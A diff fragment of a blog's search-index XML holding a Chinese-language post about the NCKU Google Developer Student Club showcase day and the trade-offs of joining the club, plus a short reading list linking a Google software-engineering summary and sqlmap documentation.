+<h1 id="NCKU-GDSC-Forum"><a href="#NCKU-GDSC-Forum" class="headerlink" title="NCKU GDSC Forum"></a>NCKU GDSC Forum</h1><p>終於到了成果發表的當天，當天就是有很多的講座以及我們自己擺設的每個小組的攤位。我們要對每位到攤位前的觀眾做講解，跟他們說我們到底做了些甚麼，然後當天的講座也是十分有趣，會很有收穫。我在聽完了前輩們的分享後，更有了想要努力前往矽谷的衝動，有種受到矽谷召喚的感覺 XD。至於更詳細的，就看一下以下的紀錄影片吧！</p>
+<div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">
+    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://www.youtube.com/embed/MWK4geiYARs" frameborder="0" allowfullscreen=""></iframe>
+</div>
+
+<h1 id="What-I-learned-in-this-year"><a href="#What-I-learned-in-this-year" class="headerlink" title="What I learned in this year"></a>What I learned in this year</h1><p>撇除掉一些 Hard skill（這是一定會學習到的），我比較想來談談加入 GDSC 的一些 Trade-off。加入 GDSC 後，勢必會壓縮到其他的時間，所以要更懂得如何安排自己的休閒娛樂以及讀書的時間。但同時，也確實可以在這裡獲得很多學業之外的東西。比如說拓展自己的人脈、吸取更多前輩的經驗，但我覺得最重要的，是可以找到一群志同道合夥伴們。這一來可以讓自己在自我精進的這條路上更不孤單，其次也可以增加自己對這種開發社群（或是身為「開發者」）的身分認同。</p>
+<p>結論上來說，如果你同時有很多其他的活動，或是想要好好的衝一下 GPA，或許可以慎重考慮一下要不要參加（因為畢竟做專案真的會花不少時間，還要上社課）；但如果你也和我一樣，相信比起分數有更重要的事，那就大膽地來參加吧，一定會收獲不少的！</p>
+<p>最後附上我們今年 GDSC 的口號：</p>
+<blockquote>
+<p>Code your goal, Fuel your soul! — <strong><em>2024 GDSC NCKU</em></strong></p>
+</blockquote>
+<p>如果這篇文章對你有幫助，歡迎<a href="https://cx330.tw/subscribe/">訂閱我的 Blog</a>，會在有新文章的時候通知你，十分感謝！</p>
+]]></content>
+      <categories>
+        <category>DevCorner</category>
+        <category>AI</category>
+      </categories>
+      <tags>
+        <tag>AI</tag>
+        <tag>GDSC</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Reading List</title>
+    <url>/Life%20and%20Talk/Reading%20List/Reading-List/</url>
+    <content><![CDATA[<ol>
+<li><a class="link"   href="https://johnliutw.medium.com/list/google-4cfac4644843" >Google 的軟體工程之道 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+<li><a class="link"   href="https://octobug.gitbooks.io/sqlmap-wiki-zhcn/content/" >Sqlmap 文檔中文版 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
+</ol>
+]]></content>
+      <categories>
+        <category>Life and Talk</category>
+        <category>Reading List</category>
+      </categories>
   </entry>
 </search>
